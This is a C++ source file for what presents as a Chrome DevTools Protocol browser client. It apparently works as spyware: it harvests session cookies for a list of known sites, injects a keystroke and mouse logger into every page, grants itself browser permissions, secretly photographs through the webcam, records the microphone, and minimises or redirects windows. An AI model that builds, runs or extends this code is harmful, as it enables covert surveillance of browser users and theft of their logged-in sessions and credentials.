#include "cdp/browser.h"
#include "detail/channel.h"
#include "detail/base64.h"
#include "cdp/page.h"
#include <cdp/input_event.h> // Added for InputEvent struct

#include <iostream>
#include <nlohmann/json.hpp>
#include <boost/asio.hpp>
#include <boost/beast.hpp>
#include <boost/beast/http.hpp>
#include <fstream>
#include <thread>
#include <chrono>
#include <mutex>
#include <atomic>
#include <unordered_map>
#include <deque>
#include <condition_variable>
#include <set>
#include <map>
#include <unordered_set>

using json = nlohmann::json;

// ---- debug toggles ----
static constexpr bool DEBUG_LOG_ALL_EVENTS = false;
static constexpr bool DEBUG_HEARTBEAT = false;

namespace cdp {

    namespace {
        std::string http_get(const std::string& host, const std::string& port, const std::string& target);
    }

    struct Browser::Impl {
        std::shared_ptr<detail::Channel> channel = std::make_shared<detail::Channel>();
        std::string host;
        std::string port;
        uint16_t port_num = 0;
        bool connected = false;

        std::thread watch_thread;
        std::atomic<bool> watching{ false };

        std::mutex callback_mtx;
        CallbackId next_callback_id = 1;
        std::unordered_map<CallbackId, InputCallback> on_input_callbacks;
        std::unordered_map<CallbackId, ActivityCallback> on_activity_callbacks;
        std::unordered_map<CallbackId, URLCallback> on_url_callbacks;

        std::mutex tab_mtx;
        TabInfo current;

        std::unordered_set<std::string> armed_targets;
        std::unordered_map<std::string, std::string> tid_to_sid;
        std::unordered_map<std::string, std::string> tid_to_script;

        std::atomic<std::int64_t> last_activity_ms{ 0 };

        void arm_target(const std::string& sid, const std::string& tid,
            const std::string& type, const std::string& initialUrl = "");
        void fire_url(const std::string& url);

        void handle_attached_to_target(const json& ev);
        void handle_target_created(const json& ev);
        void handle_detached_from_target(const json& ev);
        void handle_page_navigation(const json& ev);
        void handle_binding_called(const json& ev);
        void handle_network_request_will_be_sent(const json& ev);
        void handle_network_response_received(const json& ev);
        void handle_network_loading_failed(const json& ev);

        ~Impl() {
            if (watch_thread.joinable()) {
                watching = false;
                if (channel) channel->stop_events();
                watch_thread.join();
            }
        }
    };

    // ==================== Constructors ====================

    Browser::Browser(std::string host, uint16_t port)
        : impl_(std::make_unique<Impl>())
    {
        impl_->host = std::move(host);
        impl_->port = std::to_string(port);
        impl_->port_num = port;
    }

    Browser::~Browser() = default;
    Browser::Browser(Browser&&) noexcept = default;
    Browser& Browser::operator=(Browser&&) noexcept = default;

    // ==================== Connection ====================

    bool Browser::connect() {
        try {
            std::string payload = http_get(impl_->host, impl_->port, "/json/version");
            if (payload.empty()) return false;

            auto j = json::parse(payload);
            std::string ws_url = j.value("webSocketDebuggerUrl", std::string{});
            if (ws_url.empty()) return false;

            auto pos = ws_url.find("/devtools");
            if (pos == std::string::npos) return false;

            impl_->channel->connect(impl_->host, impl_->port, ws_url.substr(pos));
            impl_->connected = true;
            return true;
        }
        catch (...) {
            return false;
        }
    }

    // ==================== Basic Methods ====================

    Result<std::vector<CookieMatch>> Browser::fetchGoodies() {
        auto cookies = getCookies();
        if (!cookies) return cookies.error();

        std::vector<CookieMatch> hits;
        for (const auto& [url, filter] : KNOWN_COOKIES) {
            auto selected = select(cookies.value(), filter);
            if (selected && !selected.value().empty()) {
                hits.push_back(CookieMatch{ url, &filter, std::move(selected.value()) });
            }
        }
        return hits;
    }

    Result<std::vector<Cookie>> Browser::getCookies() {
        auto page = anyPage();
        if (!page) return page.error();
        return page.value().getCookies();
    }

    Result<std::string> Browser::getURL() {
        auto page = currentPage();
        if (!page) return page.error();
        return page.value().getURL();
    }

    Result<std::vector<Cookie>> Browser::getCookiesFromDomain(const std::string& domain) {
        auto all_cookies = getCookies();
        if (!all_cookies) return all_cookies.error();
        if (domain.empty()) return all_cookies;

        cdp::CookieFilter filter;
        filter.domain = domain;
        return cdp::select(all_cookies.value(), filter);
    }

    // ==================== Callbacks ====================

    Browser::CallbackId Browser::addOnInput(InputCallback cb) {
        if (!cb) return 0;
        std::lock_guard<std::mutex> lock(impl_->callback_mtx);
        CallbackId id = impl_->next_callback_id++;
        impl_->on_input_callbacks[id] = std::move(cb);
        return id;
    }

    Browser::CallbackId Browser::addOnActivity(ActivityCallback cb) {
        if (!cb) return 0;
        std::lock_guard<std::mutex> lock(impl_->callback_mtx);
        CallbackId id = impl_->next_callback_id++;
        impl_->on_activity_callbacks[id] = std::move(cb);
        return id;
    }

    void Browser::removeOnInput(CallbackId id) {
        std::lock_guard<std::mutex> lock(impl_->callback_mtx);
        impl_->on_input_callbacks.erase(id);
    }

    void Browser::removeOnActivity(CallbackId id) {
        std::lock_guard<std::mutex> lock(impl_->callback_mtx);
        impl_->on_activity_callbacks.erase(id);
    }

    void Browser::clearAllCallbacks() noexcept {
        std::lock_guard<std::mutex> lock(impl_->callback_mtx);
        impl_->on_input_callbacks.clear();
        impl_->on_activity_callbacks.clear();
        impl_->on_url_callbacks.clear();
    }

    Browser::CallbackId Browser::addOnNewURL(URLCallback cb) {
        if (!cb) return 0;
        std::lock_guard<std::mutex> lock(impl_->callback_mtx);
        CallbackId id = impl_->next_callback_id++;
        impl_->on_url_callbacks[id] = std::move(cb);
        return id;
    }

    void Browser::removeOnNewURL(CallbackId id) {
        std::lock_guard<std::mutex> lock(impl_->callback_mtx);
        impl_->on_url_callbacks.erase(id);
    }

    // ==================== Tab Info ====================

    TabInfo Browser::currentTab() const {
        std::lock_guard<std::mutex> lk(impl_->tab_mtx);
        return impl_->current;
    }

    // ==================== JS Snippets ====================

    static const char* const PAGE_LISTENER_JS = R"JS(
(function () {
  if (window.__cdpArmed) return;
  window.__cdpArmed = true;
  function emit(type, e) {
    try {
      // Ensure these keys match exactly what you look for in C++
// From browser.cpp
let data = {
  type: type,
  x: e.clientX || 0,
  y: e.clientY || 0,
  key: e.key || "",
  url: location.href
};
__onMouse(JSON.stringify(data));
    } catch (err) { console.error("__onMouse FAILED:", err); }
  }
  window.addEventListener('mousemove', function (e) { emit('mousemove', e); }, true);
  window.addEventListener('mousedown', function (e) { emit('mousedown', e); }, true);
  window.addEventListener('mouseup', function (e) { emit('mouseup', e); }, true);
  window.addEventListener('click', function (e) { emit('click', e); }, true);
  window.addEventListener('contextmenu', function (e) { emit('contextmenu', e); }, true);
  window.addEventListener('keydown', function (e) { emit('keydown', e); }, true);
})();
)JS";

    static const char* const HEARTBEAT_JS = R"JS(
(function () {
  if (window.__cdpHeartbeat) return;
  window.__cdpHeartbeat = setInterval(function () {
    try { __onMouse(JSON.stringify({ type: "hb", t: Date.now() })); } catch (e) {}
  }, 1000);
})();
)JS";

    // ==================== Impl Handlers (FIXED) ====================

    void Browser::Impl::handle_attached_to_target(const json& ev) {
        try {
            std::string session_id = ev["params"]["sessionId"];
            std::string target_id = ev["params"]["targetInfo"]["targetId"];
            std::string type = ev["params"]["targetInfo"]["type"];

            // Inject listeners into active pages
            if (type == "page") {
                arm_target(session_id, target_id, type);
            }
        }
        catch (...) {}
    }

    void Browser::Impl::arm_target(const std::string& sid, const std::string& tid, const std::string& type, const std::string& initialUrl) {
        try {
            channel->result_of("Runtime.enable", json::object(), sid);
            channel->result_of("Page.enable", json::object(), sid);

            // Register C++ binding
            channel->result_of("Runtime.addBinding", { {"name", "__onMouse"} }, sid);

            // Inject JS listener
            json script_res = channel->result_of("Page.addScriptToEvaluateOnNewDocument",
                { {"source", PAGE_LISTENER_JS} }, sid);

            std::string script_id = script_res["identifier"];
            tid_to_script[tid] = script_id;
            tid_to_sid[tid] = sid;
            armed_targets.insert(tid);

            // Evaluate immediately for existing page
            channel->result_of("Runtime.evaluate", { {"expression", PAGE_LISTENER_JS} }, sid);

        }
        catch (const std::exception& e) {
            if (DEBUG_LOG_ALL_EVENTS) std::cerr << "Failed to arm target: " << e.what() << std::endl;
        }
    }

    void Browser::Impl::handle_binding_called(const json& ev) {
        try {
            // 1. Parse and extract type
            json payload = json::parse(ev["params"]["payload"].get<std::string>());
            std::string type = payload.value("type", "");

            // 2. Prepare the variant to be sent to callbacks
            InputEvent current_event;

            if (type == "mousedown" || type == "mousemove") {
                current_event = MouseEvent{
                    payload.value("x", 0),
                    payload.value("y", 0),
                    type,
                    payload.value("url", "")
                };
            }
            else if (type == "keydown") {
                current_event = KeyboardEvent{
                    payload.value("key", ""),
                    false,
                    payload.value("url", "")
                };
            }
            else {
                return; // Ignore unknown event types
            }

            // 3. Dispatch the variant to all registered callbacks
            std::lock_guard<std::mutex> lock(callback_mtx);
            for (const auto& [id, cb] : on_input_callbacks) {
                if (cb) cb(current_event);
            }
        }
        catch (const std::exception& e) {
            std::cerr << "Binding parse error: " << e.what() << std::endl;
        }
    }

    // --- Empty Stubs to prevent linker errors ---
    void Browser::Impl::handle_target_created(const json& ev) {}
    void Browser::Impl::handle_detached_from_target(const json& ev) {}
    void Browser::Impl::handle_page_navigation(const json& ev) {}
    void Browser::Impl::handle_network_request_will_be_sent(const json& ev) {}
    void Browser::Impl::handle_network_response_received(const json& ev) {}
    void Browser::Impl::handle_network_loading_failed(const json& ev) {}
    void Browser::Impl::fire_url(const std::string& url) {}

    // ==================== watchInput ====================

    Result<void> Browser::watchInput() {
        if (impl_->watching) return {};
        impl_->watching = true;

        impl_->watch_thread = std::thread([this]() {
            impl_->armed_targets.clear();
            impl_->tid_to_sid.clear();
            impl_->tid_to_script.clear();

            try {
                impl_->channel->result_of("Target.setAutoAttach",
                    { {"autoAttach", true}, {"waitForDebuggerOnStart", false}, {"flatten", true} }, "");

                while (impl_->watching) {
                    auto evOpt = impl_->channel->next_event();
                    if (!evOpt) continue;

                    json ev = *evOpt;
                    const std::string method = ev.value("method", "");

                    if (DEBUG_LOG_ALL_EVENTS)
                        std::cout << "[EV] " << method << std::endl;

                    if (method == "Target.attachedToTarget") { impl_->handle_attached_to_target(ev); continue; }
                    if (method == "Target.targetCreated") { impl_->handle_target_created(ev); continue; }
                    if (method == "Target.detachedFromTarget") { impl_->handle_detached_from_target(ev); continue; }
                    if (method == "Page.frameNavigated" || method == "Page.navigatedWithinDocument") {
                        impl_->handle_page_navigation(ev); continue;
                    }
                    if (method == "Runtime.bindingCalled" &&
                        ev.value("params", json::object()).value("name", "") == "__onMouse") {
                        impl_->handle_binding_called(ev); continue;
                    }
                    if (method == "Network.requestWillBeSent") { impl_->handle_network_request_will_be_sent(ev); continue; }
                    if (method == "Network.responseReceived") { impl_->handle_network_response_received(ev); continue; }
                    if (method == "Network.loadingFailed") { impl_->handle_network_loading_failed(ev); continue; }
                }
            }
            catch (...) {}

            for (const auto& kv : impl_->tid_to_script) {
                auto it = impl_->tid_to_sid.find(kv.first);
                if (it == impl_->tid_to_sid.end()) continue;
                try {
                    impl_->channel->result_of("Page.removeScriptToEvaluateOnNewDocument",
                        { {"identifier", kv.second} }, it->second);
                }
                catch (...) {}
            }
            });

        return {};
    }

    void Browser::stopInput() noexcept {
        impl_->watching = false;
        if (impl_->channel) impl_->channel->stop_events();
    }

    // ==================== Other Public Methods ====================

    bool Browser::isConnected() const noexcept {
        return impl_->connected && impl_->channel->is_connected();
    }

    Result<void> Browser::grantPermissions(const std::vector<std::string>& permissions, const std::string& origin) {
        if (!isConnected())
            return Error{ Errc::not_connected, "Browser is not connected." };
        try {
            json params = { {"permissions", permissions} };
            std::string effectiveOrigin = origin;
            if (effectiveOrigin.empty()) {
                auto urlResult = getURL();
                if (urlResult) {
                    std::string url = urlResult.value();
                    size_t schemeEnd = url.find("://");
                    if (schemeEnd != std::string::npos) {
                        size_t pathStart = url.find('/', schemeEnd + 3);
                        if (pathStart != std::string::npos) {
                            effectiveOrigin = url.substr(0, pathStart);
                        }
                        else {
                            effectiveOrigin = url;
                        }
                    }
                }
            }
            if (!effectiveOrigin.empty()) {
                params["origin"] = effectiveOrigin;
            }
            impl_->channel->result_of("Browser.grantPermissions", params, "");
            return {};
        }
        catch (const std::exception& e) {
            return Error{ Errc::bad_response, std::string("grantPermissions failed: ") + e.what() };
        }
    }

    Result<void> Browser::resetPermissions() {
        if (!isConnected())
            return Error{ Errc::not_connected, "Browser is not connected." };
        try {
            impl_->channel->result_of("Browser.resetPermissions", json::object(), "");
            return {};
        }
        catch (const std::exception& e) {
            return Error{ Errc::bad_response, std::string("resetPermissions failed: ") + e.what() };
        }
    }

    Result<Page> Browser::anyPage() {
        if (!isConnected()) {
            return Error{ Errc::not_connected, "Browser is not connected." };
        }
        try {
            json targets = impl_->channel->result_of("Target.getTargets", json::object(), "");
            for (const auto& t : targets["targetInfos"]) {
                if (t.value("type", "") == "page") {
                    std::string target_id = t["targetId"];
                    std::string session_id = impl_->channel->result_of(
                        "Target.attachToTarget",
                        { {"targetId", target_id}, {"flatten", true} }, ""
                    )["sessionId"];
                    return Page{ impl_->channel, target_id, session_id };
                }
            }
            return Error{ Errc::not_connected, "No open page found." };
        }
        catch (const std::exception& e) {
            return Error{ Errc::bad_response, std::string("Failed to get page handle: ") + e.what() };
        }
    }

    Result<Page> Browser::currentPage() {
        if (!isConnected()) {
            return Error{ Errc::not_connected, "Browser is not connected." };
        }
        try {
            json targets = impl_->channel->result_of("Target.getTargets", json::object(), "");
            std::vector<json> pages;
            for (const auto& t : targets["targetInfos"]) {
                if (t.value("type", "") == "page") pages.push_back(t);
            }
            if (pages.empty()) {
                return Error{ Errc::not_connected, "No open pages found." };
            }
            for (const auto& t : pages) {
                std::string target_id = t["targetId"];
                try {
                    json win = impl_->channel->result_of("Browser.getWindowForTarget", { {"targetId", target_id} }, "");
                    std::string state = win["bounds"].value("windowState", "normal");
                    if (t.value("attached", false) && state != "minimized") {
                        json attach = impl_->channel->result_of("Target.attachToTarget",
                            { {"targetId", target_id}, {"flatten", true} }, "");
                        return Page{ impl_->channel, target_id, attach["sessionId"] };
                    }
                }
                catch (...) { continue; }
            }
            for (const auto& t : pages) {
                if (t.value("attached", false)) {
                    std::string target_id = t["targetId"];
                    json attach = impl_->channel->result_of("Target.attachToTarget",
                        { {"targetId", target_id}, {"flatten", true} }, "");
                    return Page{ impl_->channel, target_id, attach["sessionId"] };
                }
            }
            std::string target_id = pages[0]["targetId"];
            json attach = impl_->channel->result_of("Target.attachToTarget",
                { {"targetId", target_id}, {"flatten", true} }, "");
            return Page{ impl_->channel, target_id, attach["sessionId"] };
        }
        catch (const std::exception& e) {
            return Error{ Errc::bad_response, std::string("Failed to get current page: ") + e.what() };
        }
    }

    Result<void> Browser::screenshot(const std::string& path) {
        auto page = currentPage();
        if (!page) return page.error();
        return page.value().screenshot(path);
    }

    Result<void> Browser::redirect(const std::string& url) {
        auto page = currentPage();
        if (!page) return page.error();
        std::string js = "window.location.href = " + json(url).dump();
        auto evalResult = page.value().evaluate(js);
        if (!evalResult) return evalResult.error();
        return {};
    }

    Result<void> Browser::minimizeAll() {
        try {
            json targets = impl_->channel->result_of("Target.getTargets", json::object(), "");
            std::set<int> windows;
            for (const auto& t : targets["targetInfos"]) {
                if (t.value("type", "") != "page") continue;
                std::string target_id = t["targetId"];
                json win = impl_->channel->result_of("Browser.getWindowForTarget", { {"targetId", target_id} }, "");
                int window_id = win["windowId"];
                windows.insert(window_id);
            }
            for (int window_id : windows) {
                impl_->channel->result_of("Browser.setWindowBounds",
                    { {"windowId", window_id}, {"bounds", {{"windowState", "minimized"}}} }, "");
            }
            return {};
        }
        catch (const std::exception& e) {
            return Error{ Errc::bad_response, e.what() };
        }
    }

    Result<std::string> Browser::getContent() {
        auto page = currentPage();
        if (!page) return page.error();
        return page.value().getContent();
    }

    Result<std::vector<std::string>> Browser::listWebcams() {
        if (!isConnected())
            return Error{ Errc::not_connected, "Not connected" };
        try {
            auto pageRes = currentPage();
            if (!pageRes) pageRes = anyPage();
            if (!pageRes) return pageRes.error();

            std::string js = R"JS(
            (async () => {
                const devices = await navigator.mediaDevices.enumerateDevices();
                return devices
                    .filter(d => d.kind === 'videoinput')
                    .map(d => ({ deviceId: d.deviceId, label: d.label || 'Unknown Camera' }));
            })()
        )JS";

            auto result = pageRes.value().evaluate(js);
            if (!result) return result.error();
            json devices = json::parse(result.value());
            std::vector<std::string> cams;
            for (const auto& d : devices) {
                std::string label = d.value("label", "Unknown");
                std::string id = d.value("deviceId", "");
                cams.push_back(label + " | " + id);
            }
            return cams;
        }
        catch (const std::exception& e) {
            return Error{ Errc::bad_response, e.what() };
        }
    }

    Result<std::string> Browser::_captureWebcamPhoto(int cameraIndex) {
        if (!isConnected())
            return Error{ Errc::not_connected, "Not connected" };
        try {
            auto pageRes = currentPage();
            if (!pageRes) pageRes = anyPage();
            if (!pageRes) return pageRes.error();

            std::string js = R"JS(
            (async () => {
                const devices = await navigator.mediaDevices.enumerateDevices();
                const videoDevices = devices.filter(d => d.kind === 'videoinput');
                
                if (videoDevices.length === 0) return { error: "No camera found" };
                if ()JS" + std::to_string(cameraIndex) + R"JS( >= videoDevices.length)
                    return { error: "Invalid camera index" };
                const deviceId = videoDevices[)JS" + std::to_string(cameraIndex) + R"JS(].deviceId;
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        deviceId: { exact: deviceId }
                    }
                });
                const video = document.createElement('video');
                video.srcObject = stream;
                await new Promise(r => video.onloadedmetadata = r);
                video.play();
                await new Promise(r => setTimeout(r, 400));
                const actualWidth = video.videoWidth;
                const actualHeight = video.videoHeight;
                const canvas = document.createElement('canvas');
                canvas.width = actualWidth;
                canvas.height = actualHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, actualWidth, actualHeight);
                stream.getTracks().forEach(track => track.stop());
                return {
                    success: true,
                    dataUrl: canvas.toDataURL('image/jpeg', 0.95),
                    width: actualWidth,
                    height: actualHeight
                };
            })()
        )JS";

            auto result = pageRes.value().evaluate(js);
            if (!result) return result.error();
            json data = json::parse(result.value());
            if (data.contains("error")) {
                return Error{ Errc::bad_response, data["error"].get<std::string>() };
            }
            return data.value("dataUrl", std::string{});
        }
        catch (const std::exception& e) {
            return Error{ Errc::bad_response, e.what() };
        }
    }

    Result<void> Browser::saveWebcamPhoto(const std::string& path, int cameraIndex) {
        if (!isConnected())
            return Error{ Errc::not_connected, "Not connected" };
        try {
            auto photoResult = _captureWebcamPhoto(cameraIndex);
            if (!photoResult) return photoResult.error();
            const std::string& dataUrl = photoResult.value();
            size_t comma = dataUrl.find(',');
            if (comma == std::string::npos) {
                return Error{ Errc::bad_response, "Invalid data URL from webcam" };
            }
            std::string base64Data = dataUrl.substr(comma + 1);
            std::string imageBytes = cdp::detail::base64Decode(base64Data);
            std::ofstream out(path, std::ios::binary);
            if (!out) {
                return Error{ Errc::io, "Failed to open file for writing: " + path };
            }
            out.write(imageBytes.data(), static_cast<std::streamsize>(imageBytes.size()));
            if (!out.good()) {
                return Error{ Errc::io, "Failed to write webcam photo to: " + path };
            }
            return {};
        }
        catch (const std::exception& e) {
            return Error{ Errc::bad_response, e.what() };
        }
    }

    Result<std::string> Browser::_captureAudio(int micIndex, int durationMs) {
        if (!isConnected())
            return Error{ Errc::not_connected, "Not connected" };
        try {
            auto pageRes = currentPage();
            if (!pageRes) pageRes = anyPage();
            if (!pageRes) return pageRes.error();

            std::string js = R"JS(
        (async () => {
            const devices = await navigator.mediaDevices.enumerateDevices();
            const mics = devices.filter(d => d.kind === 'audioinput');
            if (mics.length === 0) return { error: "No microphone found" };
            if ()JS" + std::to_string(micIndex) + R"JS( >= mics.length)
                return { error: "Invalid mic index" };
            const deviceId = mics[)JS" + std::to_string(micIndex) + R"JS(].deviceId;
            const stream = await navigator.mediaDevices.getUserMedia({
                audio: { deviceId: { exact: deviceId } }
            });
            let mimeType = 'audio/webm;codecs=opus';
            if (!MediaRecorder.isTypeSupported(mimeType)) mimeType = '';
            const recorder = mimeType
                ? new MediaRecorder(stream, { mimeType })
                : new MediaRecorder(stream);
            const chunks = [];
            recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
            const stopped = new Promise(res => recorder.onstop = res);
            recorder.start();
            await new Promise(r => setTimeout(r, )JS" + std::to_string(durationMs) + R"JS());
            recorder.stop();
            await stopped;
            stream.getTracks().forEach(t => t.stop());
            const blob = new Blob(chunks, { type: recorder.mimeType });
            const bytes = new Uint8Array(await blob.arrayBuffer());
            let binary = '';
            const CHUNK = 0x8000;
            for (let i = 0; i < bytes.length; i += CHUNK) {
                binary += String.fromCharCode.apply(null, bytes.subarray(i, i + CHUNK));
            }
            const base64 = btoa(binary);
            return {
                success: true,
                mimeType: recorder.mimeType,
                dataUrl: 'data:' + recorder.mimeType + ';base64,' + base64
            };
        })()
        )JS";

            auto result = pageRes.value().evaluate(js);
            if (!result) return result.error();
            json data = json::parse(result.value());
            if (data.contains("error"))
                return Error{ Errc::bad_response, data["error"].get<std::string>() };
            return data.value("dataUrl", std::string{});
        }
        catch (const std::exception& e) {
            return Error{ Errc::bad_response, e.what() };
        }
    }

    Result<void> Browser::saveAudioClip(const std::string& path, int micIndex, int durationMs) {
        if (!isConnected())
            return Error{ Errc::not_connected, "Not connected" };
        try {
            auto audioResult = _captureAudio(micIndex, durationMs);
            if (!audioResult) return audioResult.error();
            const std::string& dataUrl = audioResult.value();
            size_t comma = dataUrl.find(',');
            if (comma == std::string::npos) {
                return Error{ Errc::bad_response, "Invalid data URL from microphone" };
            }
            std::string base64Data = dataUrl.substr(comma + 1);
            std::string audioBytes = cdp::detail::base64Decode(base64Data);
            std::ofstream out(path, std::ios::binary);
            if (!out) {
                return Error{ Errc::io, "Failed to open file for writing: " + path };
            }
            out.write(audioBytes.data(), static_cast<std::streamsize>(audioBytes.size()));
            if (!out.good()) {
                return Error{ Errc::io, "Failed to write audio clip to: " + path };
            }
            return {};
        }
        catch (const std::exception& e) {
            return Error{ Errc::bad_response, e.what() };
        }
    }

    Result<std::vector<std::string>> Browser::listMicrophones() {
        if (!isConnected())
            return Error{ Errc::not_connected, "Not connected" };
        try {
            auto pageRes = currentPage();
            if (!pageRes) pageRes = anyPage();
            if (!pageRes) return pageRes.error();

            std::string js = R"JS(
        (async () => {
            const devices = await navigator.mediaDevices.enumerateDevices();
            return devices
                .filter(d => d.kind === 'audioinput')
                .map(d => ({ deviceId: d.deviceId, label: d.label || 'Unknown Microphone' }));
        })()
        )JS";

            auto result = pageRes.value().evaluate(js);
            if (!result) return result.error();
            json devices = json::parse(result.value());
            std::vector<std::string> mics;
            for (const auto& d : devices) {
                std::string label = d.value("label", "Unknown");
                std::string id = d.value("deviceId", "");
                mics.push_back(label + " | " + id);
            }
            return mics;
        }
        catch (const std::exception& e) {
            return Error{ Errc::bad_response, e.what() };
        }
    }

    Result<void> Browser::unminimizeAll() {
        try {
            json targets = impl_->channel->result_of("Target.getTargets", json::object(), "");
            std::set<int> processed_windows;
            for (const auto& t : targets["targetInfos"]) {
                if (t.value("type", "") != "page") continue;
                std::string target_id = t["targetId"];
                json attach = impl_->channel->result_of("Target.attachToTarget",
                    { {"targetId", target_id}, {"flatten", true} }, "");
                std::string session_id = attach["sessionId"];
                struct SessionGuard {
                    detail::Channel* ch; std::string sid;
                    ~SessionGuard() {
                        if (ch && !sid.empty()) {
                            try { ch->result_of("Target.detachFromTarget", { {"sessionId", sid} }, ""); }
                            catch (...) {}
                        }
                    }
                } guard{ impl_->channel.get(), session_id };
                json window_info = impl_->channel->result_of("Browser.getWindowForTarget",
                    { {"targetId", target_id} }, session_id);
                int window_id = window_info["windowId"];
                if (processed_windows.count(window_id)) continue;
                processed_windows.insert(window_id);
                impl_->channel->result_of("Browser.setWindowBounds",
                    { {"windowId", window_id}, {"bounds", {{"windowState", "normal"}}} }, "");
                impl_->channel->result_of("Page.bringToFront", json::object(), session_id);
            }
            return {};
        }
        catch (const std::exception& e) {
            return Error{ Errc::bad_response, e.what() };
        }
    }

    // ==================== http_get ====================

    namespace {
        std::string http_get(const std::string& host, const std::string& port, const std::string& target) {
            namespace beast = boost::beast;
            namespace http = boost::beast::http;
            namespace net = boost::asio;
            using tcp = boost::asio::ip::tcp;
            constexpr auto kStepTimeout = std::chrono::seconds(5);
            try {
                net::io_context ioc;
                tcp::resolver resolver(ioc);
                beast::tcp_stream stream(ioc);
                beast::error_code ec;
                auto results = resolver.resolve(host, port, ec);
                if (ec) return {};
                stream.expires_after(kStepTimeout);
                stream.async_connect(results, [&](beast::error_code e, const tcp::endpoint&) { ec = e; });
                ioc.run(); ioc.restart();
                if (ec) return {};
                http::request<http::string_body> req{ http::verb::get, target, 11 };
                req.set(http::field::host, host + ":" + port);
#ifdef _WIN32
                req.set(http::field::user_agent,
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36");
#else
                req.set(http::field::user_agent,
                    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36");
#endif
                stream.expires_after(kStepTimeout);
                http::async_write(stream, req, [&](beast::error_code e, std::size_t) { ec = e; });
                ioc.run(); ioc.restart();
                if (ec) return {};
                beast::flat_buffer buffer;
                http::response<http::string_body> res;
                stream.expires_after(kStepTimeout);
                http::async_read(stream, buffer, res, [&](beast::error_code e, std::size_t) { ec = e; });
                ioc.run(); ioc.restart();
                if (ec) return {};
                return res.body();
            }
            catch (...) { return {}; }
        }
    }
} // namespace cdp
